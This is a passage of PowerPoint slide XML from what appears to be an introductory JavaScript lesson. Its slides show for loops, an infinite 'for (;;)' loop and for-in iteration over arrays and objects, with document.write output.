                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &lt;= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10</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i</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document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write</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i</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;"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infinite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loop</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> (;;)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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7EF4EF9B-94E4-43F5-B095-EC2FC373A364}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>For Loop Examples</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48131" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AEC8EEB3-BE8B-4D74-8C2C-D933C7DEA714}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4565104"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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print</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> out </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>numbers</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from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 1 to 20 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>using</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> for</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AF00DB"/>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&lt;= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>20</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</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print</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> out </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>numbers</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from</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 1 to 20 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>using</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while</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&lt;= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>20</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</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prints</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numbers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 10, 8, 6, 4 and 2</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j</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10</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j</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</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j</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</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j</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2</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same</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as j = j-2 */</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prints</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> out 10, 15, 20... 100</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AF00DB"/>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10</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&lt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>101</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5</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F4FF5E06-6FCD-4316-B9BF-57473A3FE291}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>for in</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D7776785-A90E-46F5-A499-D313BAF2C970}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4925144"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="70000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Iterates through all the keys of an object or an array</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0"/>
              <a:t>Syntax:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" i="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>variable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" i="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>object</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  /* variable gets all the keys</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  of the object */</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Examples:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</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names</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Jack"</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Jill</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>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"Jane"</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"Bob"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>let</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>in</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names</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>)  {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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document</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>names</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>]+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    }</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="fi-FI" sz="2300" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = {</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Ford"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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"Toyota"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>2</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"Nissan"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>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a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
